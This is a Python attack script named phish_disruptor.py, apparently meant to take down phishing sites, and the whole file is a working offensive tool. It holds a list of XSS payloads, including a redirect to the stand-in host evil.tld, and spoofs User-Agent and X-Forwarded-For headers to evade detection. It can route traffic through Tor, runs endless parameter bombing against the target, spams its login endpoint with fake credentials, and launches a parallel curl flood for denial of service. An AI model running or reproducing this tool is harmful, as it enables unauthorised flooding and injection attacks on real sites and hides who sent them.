#!/usr/bin/env python3
# phish_disruptor.py

import random
import time
import threading
import subprocess
import requests
import re
import os
from datetime import datetime

# Enhanced payloads including XSS-Destroyer
payloads = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>", "<body onload=alert(1)>",
    "'\"><script>alert(1)</script>", "<iframe src='javascript:alert(1)'></iframe>",
    "<math href='javascript:alert(1)'>CLICK</math>",
    "<script>document.location='https://evil.tld'</script>",
    "javascript:alert(1)", "<img src=a onerror=prompt(1337)>",
    "<details open ontoggle=confirm(1)>", "<video><source onerror='alert(1)'>",
    "<object data='javascript:alert(1)'>", "<input onfocus=alert(1) autofocus>",
    "<a href='jaVaScRiPt:alert(1)'>click</a>",
    "<div style=animation-name:rotation onanimationstart=alert(1)>",
    "<marquee onstart=alert(1)>"
]

# Stealth headers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "sqlmap/1.5.2#stable", "Googlebot/2.1", "curl/7.85.0",
    "ReconBot/1.0", "FuzzAgent/0.9", "Burp Suite", "Wget/1.21",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "Node.js/14.15", "python-requests/2.25"
]

def get_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "X-Forwarded-For": f"127.0.0.{random.randint(1, 254)}",
        "X-Request-ID": ''.join(random.choices("ABCDEF1234567890", k=12)),
        "Referer": "https://google.com",
        "Origin": "https://evil.tld",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1"
    }

def random_param_key(length=4):
    return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=length))

def session_with_tor(use_tor):
    s = requests.Session()
    if use_tor:
        s.proxies = {
            "http": "socks5h://127.0.0.1:9050",
            "https": "socks5h://127.0.0.1:9050"
        }
    return s

def mass_param_bomb(target_url):
    print(f"\nStarting mass param bombing on {target_url}\n")
    use_tor = input("Route through Tor? (y/n): ").lower().startswith("y")
    s = session_with_tor(use_tor)

    if not os.path.exists("reports"):
        os.makedirs("reports")
    log_path = f"reports/bomb_report_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"

    def loop():
        with open(log_path, "w") as f:
            while True:
                try:
                    for p in payloads:
                        param = random_param_key()
                        headers = get_headers()
                        full_url = f"{target_url}?{param}={p}"
                        r = s.get(full_url, headers=headers, timeout=10)
                        fake_200 = re.search(r"404|not found|error", r.text, re.I)
                        timing = r.elapsed.total_seconds()
                        line = f"[+] {full_url} -> {r.status_code} | {timing:.2f}s {'[Fake 200]' if fake_200 else ''}"
                        print(line)
                        f.write(line + "\n")
                        f.flush()
                        time.sleep(0.4)
                except Exception as e:
                    err = f"[!] Error: {e}"
                    print(err)
                    f.write(err + "\n")
                    f.flush()
                    time.sleep(2)

    threading.Thread(target=loop, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\nSaved report to {log_path}")

def full_disruption(target_url):
    print(f"\nLaunching full disruption mode on {target_url}\n")
    use_tor = input("Route through Tor? (y/n): ").lower().startswith("y")
    s = session_with_tor(use_tor)

    if not os.path.exists("reports"):
        os.makedirs("reports")
    log_path = f"reports/disrupt_report_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"

    def spam_login():
        with open(log_path, "a") as f:
            while True:
                try:
                    data = {"username": f"user{random.randint(1000,9999)}", "password": "wrongpass"}
                    headers = get_headers()
                    r = s.post(f"{target_url}/login", data=data, headers=headers, timeout=5)
                    line = f"[Login Spam] -> {r.status_code}"
                    print(line)
                    f.write(line + "\n")
                    f.flush()
                    time.sleep(0.6)
                except Exception as e:
                    err = f"[!] Spam error: {e}"
                    print(err)
                    f.write(err + "\n")
                    f.flush()
                    time.sleep(1)

    def param_loop():
        with open(log_path, "a") as f:
            while True:
                try:
                    bomb_url = f"{target_url}/us"
                    for p in payloads:
                        param = random_param_key()
                        headers = get_headers()
                        r = s.get(f"{bomb_url}?{param}={p}", headers=headers, timeout=5)
                        fake_200 = re.search(r"404|not found", r.text, re.I)
                        line = f"[Fuzz] {param}={p} -> {r.status_code} {'[Fake 200]' if fake_200 else ''}"
                        print(line)
                        f.write(line + "\n")
                        f.flush()
                        time.sleep(0.4)
                except Exception as e:
                    err = f"[!] Param loop error: {e}"
                    print(err)
                    f.write(err + "\n")
                    f.flush()
                    time.sleep(1)

    def curl_monitor():
        with open(log_path, "a") as f:
            while True:
                try:
                    headers = get_headers()
                    r = s.get(target_url, headers=headers, timeout=5)
                    fake_200 = re.search(r"404|not found", r.text, re.I)
                    timing = r.elapsed.total_seconds()
                    line = f"[Monitor] {target_url} -> {r.status_code} | {timing:.2f}s {'[Fake 200]' if fake_200 else ''}"
                    print(line)
                    f.write(line + "\n")
                    f.flush()
                    time.sleep(2)
                except Exception as e:
                    err = f"[!] Monitor error: {e}"
                    print(err)
                    f.write(err + "\n")
                    f.flush()
                    time.sleep(2)

    def curl_flood():
        print("[Curl Flood] Launching curl-based flood (GNU parallel required)")
        try:
            cmd = f"seq 1 500 | parallel -j50 curl -s -x socks5h://127.0.0.1:9050 {target_url}"
            subprocess.run(cmd, shell=True)
        except Exception as e:
            print(f"[!] Curl flood error: {e}")

    threading.Thread(target=spam_login, daemon=True).start()
    threading.Thread(target=param_loop, daemon=True).start()
    threading.Thread(target=curl_monitor, daemon=True).start()
    threading.Thread(target=curl_flood, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\nDisruption stopped. Report saved to {log_path}")
